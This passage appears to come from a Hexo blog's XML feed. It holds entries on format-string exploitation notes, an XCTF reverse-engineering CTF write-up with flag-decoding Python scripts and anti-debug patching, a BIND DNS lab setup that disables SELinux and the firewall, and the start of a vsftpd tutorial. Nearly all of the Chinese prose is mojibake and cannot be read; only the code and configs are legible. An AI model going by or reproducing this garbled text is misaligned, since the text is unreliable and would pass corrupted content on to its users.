ä¸ªé—®é¢˜ï¼š</p><ul><li>åœ¨64ä½ä¸­ï¼Œå¹¶ä¸å¥½ç”¨ï¼Œè‡ªåŠ¨ç”Ÿæˆçš„payloadä¸­ï¼Œå®ƒä¸ä¼šå°†åœ°å€æ”¾åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åï¼Œå¯¼è‡´ç”¨ä¸äº†ã€‚</li><li>åœ¨é¢å¯¹å•æ¬¡printfï¼Œå®æ–½å¤šæ¬¡å†™å…¥çš„æ—¶å€™å…¶æ›´æ˜¾çš„ååˆ†æ— åŠ›ã€‚</li></ul><p>è®°å½•åˆ°è¿™é‡Œï¼Œç†è®ºéƒ¨åˆ†å°±å·®ä¸å¤šå®Œäº†ï¼Œä¸‹ä¸€ç¯‡ä¸»è¦è®°å½•çš„å°±æ˜¯é¢˜è§£ç¯‡ï¼Œä¼šåŒ…å«ä¸€äº›æŠ€å·§ï¼Œå¸¸è§çš„ctfæ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ç›®æ¼æ´åˆ©ç”¨çš„å¸¸è§å¥—è·¯ï¼Œè¿˜æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„é«˜çº§åˆ©ç”¨ï¼ˆå½“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„bufåœ¨bssä¸Šï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬æ— æ³•ç›´æ¥å¾€æ ˆä¸Šå†™åœ°å€ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿå¹¶ä¸”è¿™ç§é¢˜ç›®å¸¸åœ¨èµ›é¢˜ä¸­å‡ºç°ï¼‰</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XCTF\_é«˜æ ¡æˆ˜ç–«èµ›\_RE-å¤©æ´¥å“</title>
    <link href="/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
    <url>/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/</url>
    
    <content type="html"><![CDATA[<h1 id="XCTF-é«˜æ ¡æˆ˜ç–«èµ›-RE-å¤©æ´¥å“"><a href="#XCTF-é«˜æ ¡æˆ˜ç–«èµ›-RE-å¤©æ´¥å“" class="headerlink" title="XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“_"></a>XCTF_é«˜æ ¡æˆ˜ç–«èµ›_RE_ å¤©æ´¥å“_</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤ç°ä¸€ä¸ªé¢˜ï¼Œå½“æ—¶åªåšå‡ºæ¥ç¬¬ä¸€å±‚åŠ å¯†ã€‚å› ä¸ºè¿˜æ²¡æ€ä¹ˆæ¥è§¦åè°ƒè¯•è·Ÿä»£ç æ··æ·†ï¼Œåšä¸ä¸‹å»äº†ï¼Œä¸è¿‡ä¸‹æ¥å¤ç°å‘ç°äº†è¾ƒä¸ºç®€å•çš„åŠæ³•å‡ºæ¥è¿™ä¸ªé¢˜ï¼Œä¹Ÿæ˜¯å­¦åˆ°å¾ˆå¤šï¼Œå°±è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="åˆæ­¥è¿è¡Œ"><a href="#åˆæ­¥è¿è¡Œ" class="headerlink" title="åˆæ­¥è¿è¡Œ"></a>åˆæ­¥è¿è¡Œ</h2><p>å‘ç°è¿˜éœ€è¦è£…ä¸ªcgwin1.dllï¼Œè¿™ä¸ªå¾ˆå¥½æ‰¾ï¼Œä¸è¿‡è¦æ³¨æ„64ä½ç³»ç»Ÿï¼Œwindowsç›®å½•ä¸‹çš„system32 è·Ÿsyswow64éƒ½è¦æ”¾å…¥ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/UJeTGU.png" srcset="/img/loading.gif" alt><br>çœ‹æ¥æ˜¯éœ€è¦è¾“å…¥åˆ¤æ–­ã€‚</p><h2 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/9N8fOI.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œå°±æ˜¯ç¬¬ä¸€å±‚éªŒè¯äº†ï¼Œåæ¥äº†è§£åˆ°è¿™ä¸ªæ˜¯smcåŠ å¯†ï¼Œæˆ‘æ˜¯ç›´æ¥å†™Pythonä¸€ä½ä½çˆ†ç ´å‡ºæ¥çš„ã€‚</p><pre><code class="python">v39 = &#39;Rising_Hopper!&#39;result = &#39;&#39;key = [17,8,6,10,15,20,42,59,47,3,47,4,16,72,62,0,7,16]tag = [0x52,0x69,0x73,0x69,0x6E,0x67,0x5f,0x48,0x6f,0x70,0x70,0x65,0x72,0x21]for i in range(len(key)):    x = 0    flag = 1    while flag:        if ~(x &amp; tag[i % 14]) &amp; (x | tag[i % 14])==key[i] :            flag = 0            result += chr(x)        else:            x += 1print(result)#result = &#39;Caucasus@s_ability&#39;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KxEedJ.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/q0wQpI.png" srcset="/img/loading.gif" alt><br>ç„¶åè¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œå‘ç°è¿™é‡Œæ ¹æ®åˆšåˆšè§£å‡ºæ¥çš„å­—ç¬¦ä¸²ï¼Œä¼ å…¥åå¯¹*<em>Unk_10040164D *</em> åšäº†ä¸€äº›å¤„ç†ç„¶ååˆè¿”å›åˆ°è¿™å †æ•°æ®ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/bEqzBA.png" srcset="/img/loading.gif" alt><br>ç›´æ¥è·Ÿè¿›å»æ˜¯æ²¡ä»€ä¹ˆç”¨çš„ã€‚æ‰€ä»¥éœ€è¦åŠ¨æ€è°ƒè¯•ï¼Œçœ‹çœ‹ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œï¼Œæ˜¯æ€ä¹ˆæ ·çš„ã€‚</p><p>ç„¶åä¼šå‘ç°ï¼ŒidaåŠ¨æ€è°ƒè¯•ç›´æ¥æ–­æ‰äº†ï¼Œè‚¯å®šæ˜¯æœ‰åè°ƒè¯•äº†ã€‚x64å¯ä»¥è°ƒè¯•ï¼Œä½†æ˜¯å®šä½å…³é”®å¤„æœ‰ç‚¹éš¾ï¼Œå¹¶ä¸”çœ‹æ±‡ç¼–ä»£ç ä¹Ÿè®©è‡ªå·±è¿™ä¸ªèœé¸¡çœ‹åäº†ã€‚æ‰€ä»¥å°±æƒ³åŠæ³•ç ´é™¤å¯¹idaçš„åè°ƒè¯•ï¼Œç„¶ååˆ°äº†å…³é”®ä»£ç ä¹Ÿå°±æ˜¯å¤„ç†ä»¥åçš„Unk10040164Dï¼Œçœ‹çœ‹é€»è¾‘æ˜¯ä¹Ÿæƒ³åŠæ³•<strong>å°†å…¶æ”¹å˜æˆä¼ªä»£ç </strong>ï¼Œè¿™æ ·å°±å¥½åˆ†æå¤šäº†ã€‚</p><h3 id="patchç¨‹åº"><a href="#patchç¨‹åº" class="headerlink" title="patchç¨‹åº"></a>patchç¨‹åº</h3><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/A43P7J.png" srcset="/img/loading.gif" alt><br>è·Ÿè¿›å…¥å¼•ç”¨å‡½æ•°ï¼Œå‘ç°æ˜¯åˆ©ç”¨çª—å£äº‹ä»¶æ¥æ£€æµ‹æ˜¯å¦è¢«è°ƒè¯•å™¨è°ƒè¯•ã€‚å¹¶ä¸”åœ¨å…¶ä¸­ä¹Ÿå‘ç°äº†idaï¼Œè¿™é‡Œpatchç¨‹åºå¯ä»¥ç”¨<strong>010editor</strong>ï¼Œç›´æ¥æŠŠidaçš„ç›¸å…³å­—çœ¼æ”¹æˆå…¶ä»–çš„å°±è¡Œã€‚ä½†æ˜¯è¦æ³¨æ„ä¸è¦ç ´åå…¶ä»–çš„æ•°æ®ï¼š<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/o7Pjq9.png" srcset="/img/loading.gif" alt><br>æˆ‘èµ·åˆæ”¹æˆè¿™æ ·å°±ä¸è¡Œï¼Œä½ä½å¯¹é½ï¼Œæ”¹æˆå…¶ä»–å­—ç¬¦ä¸²å°±å¥½äº†ã€‚</p><h3 id="idaåŠ¨æ€è°ƒè¯•ï¼š"><a href="#idaåŠ¨æ€è°ƒè¯•ï¼š" class="headerlink" title="idaåŠ¨æ€è°ƒè¯•ï¼š"></a>idaåŠ¨æ€è°ƒè¯•ï¼š</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/1biVvy.png" srcset="/img/loading.gif" alt><br>æ–­åœ¨è¿™é‡Œï¼Œç„¶åè¿›å…¥è¿™å…¥Unk10040164D å‡½æ•°çš„æ—¶å€™ï¼ŒF7è¿›å…¥ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/hyi1pE.png" srcset="/img/loading.gif" alt><br>å‘ç°å·²ç»æœ‰æ­£å¸¸çš„æ±‡ç¼–ä»£ç å‡ºæ¥äº†ï¼ˆè¿™é‡Œæˆ‘çš„æ˜¯å·²ç»ä¿®æ”¹è¿‡çš„ï¼‰ï¼Œæ— æ³•f5åç¼–è¯‘ï¼Œè¿™æ—¶å€™å¯ä»¥åœ¨æœ€åˆæ®µpush rbp ä¸Šé¢ï¼Œå³é”®æ–°å»ºä¸€ä¸ªå‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/rgwAq4.png" srcset="/img/loading.gif" alt><br>æ•´å®Œçš„æ ·å­ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/V3341J.png" srcset="/img/loading.gif" alt><br>ç„¶åå°±å¯ä»¥f5åç¼–è¯‘äº†ï¼Œå¹¶ä¸”å¾ˆæ¸…æ™°çš„å°±å¯ä»¥çœ‹å‡ºç¨‹åºé€»è¾‘ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/zuetQy.png" srcset="/img/loading.gif" alt><br>ç„¶åè§£å¯†è¿™é‡Œï¼š</p><pre><code class="python">flag = &#39;&#39;key = [2007666,2125764,1909251,2027349,2421009,1653372,2047032,2184813,2302911,0x2289F9,1909251,2165130,1968300,0x223D16,2066715,2322594,1987983,0x223D16,1869885,2066715,0x2289F9,1869885,0xEB773,0xE6A90,0xE6A90,0xE6A90,728271,1869885,0x2289F9,2283228,0x223D16,2184813,2165130,2027349,1987983,0x223D16,1869885,2283228,2047032,1909251,2165130,1869885,2401326,1987983,0x223D16,2184813,885735,2184813,2165130,1987983,2460375]for i in range(51) :    flag += chr(int(key[i] / 19683))print(flag)</code></pre><p>ç„¶åå°±æ‹¿åˆ°flagäº†ã€‚æ¯”èµ·å¾ˆå¤šå¤§å¸ˆå‚…çš„dumpæ ¸å¿ƒä»£ç ï¼Œå†è¿›è¡Œåˆ†æï¼Œå¯¹æˆ‘æ¥è¯´è¿˜æ˜¯å¤ªéš¾äº†ã€‚æ„Ÿè§‰åœ¨idaé‡Œåˆ°å…³é”®å¤„ï¼Œåˆ›å»ºå‡½æ•°ï¼Œç”Ÿæˆä¼ªä»£ç æ›´ç®€å•ï¼Œä¹Ÿå¾ˆæ¸…æ™°ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux- DNSæ­å»ºè®°å½•</title>
    <link href="/2020/03/11/linux_%20DNS%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/11/linux_%20DNS%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>å…¨ç§°ï¼š domain name system<br><img src="http://qiqianyun.chumen77.xyz/uPic/lHjkck.png" srcset="/img/loading.gif" alt></p><h2 id="åŸŸåæœåŠ¡åŸºç¡€"><a href="#åŸŸåæœåŠ¡åŸºç¡€" class="headerlink" title="åŸŸåæœåŠ¡åŸºç¡€"></a>åŸŸåæœåŠ¡åŸºç¡€</h2><h3 id="DNSä½œç”¨åŠç±»å‹"><a href="#DNSä½œç”¨åŠç±»å‹" class="headerlink" title="DNSä½œç”¨åŠç±»å‹"></a>DNSä½œç”¨åŠç±»å‹</h3><h4 id="DNS-ç³»ç»Ÿçš„ä½œç”¨-ï¼š"><a href="#DNS-ç³»ç»Ÿçš„ä½œç”¨-ï¼š" class="headerlink" title="DNS ç³»ç»Ÿçš„ä½œç”¨ ï¼š"></a>DNS ç³»ç»Ÿçš„ä½œç”¨ ï¼š</h4><ul><li>æ­£å‘è§£æï¼šæ ¹æ®ä¸»æœºåç§°ï¼ˆåŸŸåï¼‰æŸ¥æ‰¾å¯¹åº”çš„ IP åœ°å€ï¼ˆæœ€å¸¸è§ï¼‰</li><li>åå‘è§£æï¼šæ ¹æ® IP åœ°å€æŸ¥æ‰¾å¯¹åº”çš„ä¸»æœºåŸŸåï¼ˆé€šä¿¡è¡Œä¸šå¸¸ç”¨ï¼‰</li></ul><h4 id="DNS-ç³»ç»Ÿçš„å·¥ä½œæ¨¡å¼ï¼š"><a href="#DNS-ç³»ç»Ÿçš„å·¥ä½œæ¨¡å¼ï¼š" class="headerlink" title="DNS ç³»ç»Ÿçš„å·¥ä½œæ¨¡å¼ï¼š"></a>DNS ç³»ç»Ÿçš„å·¥ä½œæ¨¡å¼ï¼š</h4><ul><li>é€’å½’æŸ¥è¯¢ ï¼šè®¿é—®å¿…é¡»æœ‰ä¸€æ¬¡ä¸€å›ï¼Œä¼šè¿”å›æˆåŠŸæˆ–è€…å¤±è´¥ã€‚</li><li>è¿­ä»£æŸ¥è¯¢ ï¼šå¤šæ¬¡è®¿é—®ï¼Œå¤šæ¬¡è¿”å›ï¼Œå¿…é¡»è¿”å›ä¸€ä¸ªæ­£ç¡®çš„åœ°å€ã€‚<h4 id="åŸŸåç»“æ„ï¼š"><a href="#åŸŸåç»“æ„ï¼š" class="headerlink" title="åŸŸåç»“æ„ï¼š"></a>åŸŸåç»“æ„ï¼š</h4><img src="http://qiqianyun.chumen77.xyz/uPic/KgLSqJ.png" srcset="/img/loading.gif" alt><br>å…¨ä¸–ç•Œæœ‰13å°æ ¹åŸŸåæœåŠ¡å™¨ã€‚<h4 id="BINDè½¯ä»¶æœåŠ¡"><a href="#BINDè½¯ä»¶æœåŠ¡" class="headerlink" title="BINDè½¯ä»¶æœåŠ¡"></a>BINDè½¯ä»¶æœåŠ¡</h4></li></ul><pre><code class="html">æœåŠ¡åï¼šnamed ç«¯å£å·ï¼š53ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/named.confä¿å­˜ DNS è§£æè®°å½•çš„æ•°æ®æ–‡ä»¶ä½äºï¼š/var/named/</code></pre><h4 id="ä¸»é…ç½®æ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š"><a href="#ä¸»é…ç½®æ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š" class="headerlink" title="ä¸»é…ç½®æ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š"></a>ä¸»é…ç½®æ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š</h4><pre><code class="html">listen-on port 53 { 127.0.0.1; }; //è¦å¡«å…¥è‡ªå·±ä¸»æœºiplisten-on-v6 port 53 { ::1; }; allow-query     { any; };//æ„æ€æ˜¯ç»™ä»»ä½•ç½‘æ®µè¿›è¡Œè§£æ</code></pre><p>åˆ†åˆ«æ˜¯: ipv4ç›‘å¬ç«¯å£å’Œipåœ°å€ï¼Œé»˜è®¤åªæœ‰æœ¬åœ°çš„<br>  ipv6çš„ç›‘å¬ç«¯å£å’Œipåœ°å€</p><pre><code class="html">recursion yes;             // é€’å½’è¿˜æ˜¯è¿­ä»£æŸ¥è¯¢dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto;</code></pre><p>è¿™ä¸ªæ˜¯dnsæ§åˆ¶é˜²æ­¢æ¬ºéª—ç”¨æˆ·ã€‚ä½†æ˜¯å› ä¸ºå…¶åŠ ä¸Šäº†åŒ…çš„éªŒè¯ï¼Œå†ä¼ ç»™æœåŠ¡å™¨æ—¶å€™ï¼ŒæœåŠ¡å™¨è¿›è¡Œæ‹†åŒ…éªŒè¯ï¼Œä¼šå¢åŠ æœåŠ¡å™¨çš„è´Ÿè·ï¼Œæ‰€ä»¥ç”¨çš„ä¸å¤šã€‚</p><h4 id="åŒºåŸŸæ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š"><a href="#åŒºåŸŸæ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š" class="headerlink" title="åŒºåŸŸæ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š"></a>åŒºåŸŸæ–‡ä»¶éƒ¨åˆ†å‚æ•°ï¼š</h4><pre><code class="html">    zone &quot;baidu.com&quot; IN {      type master;      file &quot;baidu.localhost&quot;; //æœ¬æœºè®°å½•æ–‡ä»¶åç§°ï¼ˆå¯ä»¥diyï¼‰      allow-update { none; };       };     //æ­£å‘    zone &quot;131.140.168.192.in-addr.arpa&quot; IN {               type master;               file &quot;baidu.empty&quot;;              allow-update { none; };      };    //åå‘//å¯¹äºå…¶ä¸­ file è‡ªå®šä¹‰çš„åå­—ï¼Œè¦ä¸æ•°æ®é…ç½®æ–‡ä»¶é‡Œé¢åå­—ç›¸åŒã€‚</code></pre><h2 id="å®éªŒæ­å»ºè¿‡ç¨‹"><a href="#å®éªŒæ­å»ºè¿‡ç¨‹" class="headerlink" title="å®éªŒæ­å»ºè¿‡ç¨‹"></a>å®éªŒæ­å»ºè¿‡ç¨‹</h2><p>è¦æ±‚ï¼šwwwä¸»æœºè§£æä¸º172.16.10.5ï¼›ftpä¸»æœºè§£æä¸º172.16.10.6ï¼šmailä¸»æœºè§£æä¸º172.16.10.8ï¼šDNSä¸»æœºè§£æä¸ºæœ¬æœºIP172.16.10.9ï¼›æ·»åŠ æ³›è§£æè®°å½•ï¼›åŒæ—¶æ·»åŠ wwwçš„åˆ«åè®°å½•ns1</p><h3 id="æœåŠ¡å™¨ä¸»æœº"><a href="#æœåŠ¡å™¨ä¸»æœº" class="headerlink" title="æœåŠ¡å™¨ä¸»æœº"></a>æœåŠ¡å™¨ä¸»æœº</h3><h4 id="å…³é—­é˜²ç«å¢™ã€SELinux"><a href="#å…³é—­é˜²ç«å¢™ã€SELinux" class="headerlink" title="å…³é—­é˜²ç«å¢™ã€SELinux"></a>å…³é—­é˜²ç«å¢™ã€SELinux</h4><pre><code class="html">vi /etc/selinux/config</code></pre><p>æŠŠæ”¹æˆ SELINUX = disabled ç„¶å<code>setenforce 0</code></p><p><code>systemctl stop firewalld.service</code> å…³é—­é˜²ç«å¢™ã€‚</p><h4 id="é…ç½®ä¸»é…ç½®æ–‡ä»¶ï¼š"><a href="#é…ç½®ä¸»é…ç½®æ–‡ä»¶ï¼š" class="headerlink" title="é…ç½®ä¸»é…ç½®æ–‡ä»¶ï¼š"></a>é…ç½®ä¸»é…ç½®æ–‡ä»¶ï¼š</h4><pre><code class="html">vi /etc/named.conf</code></pre><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/sgXisx.png" srcset="/img/loading.gif" alt><br>æ³¨æ„åˆ†å·ä¸è¦å¿˜è®°ï¼Œipå¡«çš„æ˜¯æœ¬æœºåœ°å€ã€‚</p><h4 id="é…ç½®åŒºåŸŸæ–‡ä»¶"><a href="#é…ç½®åŒºåŸŸæ–‡ä»¶" class="headerlink" title="é…ç½®åŒºåŸŸæ–‡ä»¶"></a>é…ç½®åŒºåŸŸæ–‡ä»¶</h4><pre><code class="html">vi /etc/named.rfc1912.zones</code></pre><pre><code class="html">zone &quot;chumen77.com&quot; IN {        type master;        file &quot;chumen77.localhost&quot;;        allow-update { none; };};zone &quot;10.16.172.in-addr.arpa&quot; IN {        type master;        file &quot;chumen77.loopback&quot;;        allow-update { none; };};</code></pre><ul><li>å…¶ä¸­æ³¨æ„åå‘è§£ææ—¶ï¼Œipåœ°å€çš„åå†™ï¼Œè¿˜æœ‰å†™åˆ°ipåœ°å€ç¬¬ä¸‰ä¸ªæ®µã€‚</li><li>å¹¶ä¸”æ­£å‘è§£æå’Œåå‘è§£æçš„æ–‡ä»¶åå­—è¦ç»™è®°ä½ï¼Œä¸€ä¼šéœ€è¦å»æŒ‰åç§°é…ç½®çš„ã€‚</li></ul><h4 id="é…ç½®æ­£å‘åå‘è§£ææ•°æ®æ–‡ä»¶"><a href="#é…ç½®æ­£å‘åå‘è§£ææ•°æ®æ–‡ä»¶" class="headerlink" title="é…ç½®æ­£å‘åå‘è§£ææ•°æ®æ–‡ä»¶"></a>é…ç½®æ­£å‘åå‘è§£ææ•°æ®æ–‡ä»¶</h4><pre><code class="html">cp -p /var/named/named.localhost /var/named/chumen77.localhostcp -p /var/named/named.empty /var/named/chumen77.loopback</code></pre><ul><li>-p æ˜¯ç”¨æ¥å¤åˆ¶æ–‡ä»¶çš„æƒé™æƒ…å†µã€‚</li><li>æ¥æ‹·è´ä¸€ä¸‹ï¼Œæ–¹ä¾¿ç›´æ¥ä¿®æ”¹ã€‚</li></ul><p>æ­£å‘è§£ææ–‡ä»¶ ï¼š</p><pre><code class="html">$TTL 1D@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.www     IN      A       172.16.10.5ftp     IN      A       172.16.10.6mail    IN      A       172.16.10.8dns     IN      A       172.16.10.131ns1     IN      CNAME   www*       IN      A       172.16.10.10</code></pre><p>åå‘è§£ææ–‡ä»¶ï¼š</p><pre><code class="html">$TTL 3H@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.5       PTR     www.chumen77.com.6       PTR     ftp.chumen77.com.8       PTR     mail.chumen77.com.131     PTR     dns.chumen77.com.*       PTR     xxx.chumen77.com.</code></pre><p>æ³¨æ„æ¯ä¸ªç½‘å€åé¢è¦åŠ ä¸ªç‚¹ã€‚</p><h4 id="æ£€æŸ¥å’Œå¼€å¯"><a href="#æ£€æŸ¥å’Œå¼€å¯" class="headerlink" title="æ£€æŸ¥å’Œå¼€å¯"></a>æ£€æŸ¥å’Œå¼€å¯</h4><p><code>named-checkzone</code> å¯ä»¥å¯¹ä¸Šé¢4ä¸ªé…ç½®æ–‡ä»¶è¿›è¡Œè¯­æ³•é—®é¢˜çš„æ£€æŸ¥ï¼Œå‡ºç°okå°±æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜äº†ã€‚</p><pre><code class="html">systemctl start named</code></pre><p>å¼€å¯æœåŠ¡ï¼Œå¦‚æœå‡ºç°æ— æ³•å¼€å¯ï¼Œæœ‰å¼‚å¸¸ï¼š</p><pre><code class="html">cat /var/log/messages </code></pre><p>ç”¨è¿™ä¸ªå‘½ä»¤å»æŸ¥é‚£ä¸ªé…ç½®æ–‡ä»¶é‡Œé¢çš„å†…å®¹å¡«é”™äº†ï¼Œç„¶åæ”¹ä¸€ä¸‹å°±okäº†ã€‚</p><h3 id="å®¢æˆ·æœºè®¾ç½®"><a href="#å®¢æˆ·æœºè®¾ç½®" class="headerlink" title="å®¢æˆ·æœºè®¾ç½®"></a>å®¢æˆ·æœºè®¾ç½®</h3><h4 id="ç½‘å¡è®¾ç½®"><a href="#ç½‘å¡è®¾ç½®" class="headerlink" title="ç½‘å¡è®¾ç½®"></a>ç½‘å¡è®¾ç½®</h4><pre><code class="html">vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></pre><p>ä¿®æ”¹ç½‘å¡ä¿¡æ¯ ï¼š</p><pre><code class="html">DNS1=192.168.140.131</code></pre><p>è¦åœ¨æœ€ååŠ ä¸Šä½ dnsæœåŠ¡å™¨çš„ipã€‚æ³¨æ„æ˜¯ <code>DNS1</code>. è®¾ç½®å¥½åé‡å¯ç½‘å¡ã€‚</p><pre><code class="html">service network restart</code></pre><h4 id="æµ‹é€Ÿæ˜¯å¦æˆåŠŸ"><a href="#æµ‹é€Ÿæ˜¯å¦æˆåŠŸ" class="headerlink" title="æµ‹é€Ÿæ˜¯å¦æˆåŠŸ"></a>æµ‹é€Ÿæ˜¯å¦æˆåŠŸ</h4><p>ä½¿ç”¨ä¸€ä¸‹ <code>nslookup</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/MaK7Sw.png" srcset="/img/loading.gif" alt></p><p>æ­£å‘åå‘éƒ½æˆåŠŸäº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux\_ftpæœåŠ¡æ­å»ºè¸©å‘è®°å½•</title>
    <link href="/2020/03/11/linux_ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/11/linux_ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="linux-ftpæœåŠ¡æ­å»ºç®€å•è®°å½•"><a href="#linux-ftpæœåŠ¡æ­å»ºç®€å•è®°å½•" class="headerlink" title="linux_ftpæœåŠ¡æ­å»ºç®€å•è®°å½•_"></a>linux_ftpæœåŠ¡æ­å»ºç®€å•è®°å½•_</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç®€å•è®°å½•ä¸€ä¸‹ï¼Œftpçš„ç›¸å…³éœ€è¦è®°å½•çš„çŸ¥è¯†è·Ÿæ­å»ºæ‰€è¸©çš„å‘ã€‚</p><h2 id="ä¸¤ç§æœåŠ¡æ¨¡å¼"><a href="#ä¸¤ç§æœåŠ¡æ¨¡å¼" class="headerlink" title="ä¸¤ç§æœåŠ¡æ¨¡å¼"></a>ä¸¤ç§æœåŠ¡æ¨¡å¼</h2><ul><li>ä¸»åŠ¨æ¨¡å¼ï¼šFTPæœåŠ¡å™¨ä¸»åŠ¨å‘å®¢æˆ·ç«¯å‘èµ·è¿æ¥è¯·æ±‚ã€‚</li><li>è¢«åŠ¨æ¨¡å¼ï¼šFTPæœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯å‘èµ·è¿æ¥è¯·æ±‚ï¼ˆFTPçš„é»˜è®¤å·¥ä½œæ¨¡å¼ï¼‰ã€‚<h2 id="vsftpdæœåŠ¡ç¨‹åº"><a href="#vsftpdæœåŠ¡ç¨‹åº" class="headerlink" title="vsftpdæœåŠ¡ç¨‹åº"></a>vsftpdæœåŠ¡ç¨‹åº</h2>ftpæ˜¯Linuxç³»ç»Ÿä¸­ä»¥å‘½ä»¤è¡Œç•Œé¢çš„æ–¹å¼æ¥ç®¡ç†FTPä¼ è¾“æœåŠ¡çš„å®¢æˆ·ç«¯å·¥å…·ã€‚æˆ‘ä»¬é¦–å…ˆæ‰‹åŠ¨å®‰è£…è¿™ä¸ªftpå®¢æˆ·ç«¯å·¥å…·ï¼Œä»¥ä¾¿åœ¨åç»­å®éªŒä¸­æŸ¥çœ‹ç»“æœã€‚<br>vsftpdä½œä¸ºæ›´åŠ å®‰å…¨çš„æ–‡ä»¶ä¼ è¾“çš„æœåŠ¡ç¨‹åºï¼Œå…è®¸ç”¨æˆ·ä»¥<strong>ä¸‰ç§è®¤è¯æ¨¡å¼</strong>ç™»å½•åˆ°FTPæœåŠ¡å™¨ä¸Šã€‚</li><li><strong>åŒ¿åå¼€æ”¾æ¨¡å¼</strong>ï¼šæ˜¯ä¸€ç§æœ€ä¸å®‰å…¨çš„è®¤è¯æ¨¡å¼ï¼Œä»»ä½•äººéƒ½å¯ä»¥æ— éœ€å¯†ç éªŒè¯è€Œç›´æ¥ç™»å½•åˆ°FTPæœåŠ¡å™¨ã€‚</li><li><strong>æœ¬åœ°ç”¨æˆ·æ¨¡å¼</strong>ï¼šæ˜¯é€šè¿‡<strong>Linuxç³»ç»Ÿæœ¬åœ°çš„è´¦æˆ·å¯†ç </strong>ä¿¡æ¯è¿›è¡Œè®¤è¯çš„æ¨¡å¼ï¼Œç›¸è¾ƒäºåŒ¿åå¼€æ”¾æ¨¡å¼æ›´å®‰å…¨ï¼Œè€Œä¸”é…ç½®èµ·æ¥ä¹Ÿå¾ˆç®€å•ã€‚ä½†æ˜¯å¦‚æœè¢«é»‘å®¢ç ´è§£äº†è´¦æˆ·çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥ç•…é€šæ— 